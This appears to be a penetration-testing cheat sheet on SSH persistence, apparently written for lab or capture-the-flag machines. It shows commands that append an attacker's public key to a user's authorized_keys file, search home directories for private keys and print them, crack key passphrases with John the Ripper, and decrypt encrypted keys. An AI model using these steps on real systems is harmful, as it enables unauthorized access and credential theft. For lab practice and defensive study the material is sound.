---
icon: camera-cctv
---

# Persistence

{% hint style="info" %}
### <mark style="color:orange;">`SSH`</mark> <mark style="color:purple;">Key Injection</mark>

{% code title="Generate SSH Keys" %}
```sh
ssh-keygen -t ed25519 -f key
```
{% endcode %}

* <mark style="color:purple;">To make sure the execute properly give it restricted permissions:</mark>

```sh
chmod 600 id_rsa
```

* <mark style="color:purple;">If</mark> <mark style="color:orange;">**`authorized_keys`**</mark> <mark style="color:purple;">file doesn't exist create one with your public key:</mark>

```sh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJsqrD2TiYF/KEidiuQncxpjkUU4CDS2A3lmhz1jeHIi b0llull0s@p4n1c" > /home/dvir/.ssh/authorized_keys
```

* <mark style="color:purple;">Other wise append your public key:</mark>

```sh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJsqrD2TiYF/KEidiuQncxpjkUU4CDS2A3lmhz1jeHIi b0llull0s@p4n1c" >> /home/dvir/.ssh/authorized_keys
```

* <mark style="color:purple;">Now just connect with your private key:</mark>

```sh
ssh -i key dvir@10.10.11.8
```

***

### <mark style="color:red;">`Using Existing keys`</mark>

{% code title="Look for the private key" %}
```bash
find /home/user -name "id_*" -exec cat {} \;
```
{% endcode %}

* <mark style="color:purple;">Once you find it, just copy the key in your</mark> <mark style="color:orange;">**`.ssh`**</mark> <mark style="color:purple;">directory and ssh in.</mark>
* <mark style="color:purple;">Also you can, check If the Corresponding private/public Key is known by using this</mark> [<mark style="color:orange;">**`repo`**</mark>](https://github.com/rapid7/ssh-badkeys)<mark style="color:purple;">.</mark>

***

### <mark style="color:red;">`Crack the passphrase`</mark>&#x20;

* <mark style="color:purple;">Once you got the private key, you can use</mark> <mark style="color:orange;">**`ssh2john`**</mark> <mark style="color:purple;">to generate a hash from the key:</mark>

```bash
ssh2john private_key > private_key.hash
```

* <mark style="color:purple;">Then feed this hash into</mark> <mark style="color:orange;">**`John the Ripper`**</mark><mark style="color:purple;">:</mark>

```bash
john private_key.hash --wordlist=/path/to/wordlist
```

***

### <mark style="color:red;">`Clone the key`</mark>

* <mark style="color:purple;">Sometimes you may need to copy an encrypted key to its decrypted version:</mark>

```sh
openssl rsa -in spanishdancer.key -out ~/keys/ariekei-spanishdancer
```
{% endhint %}

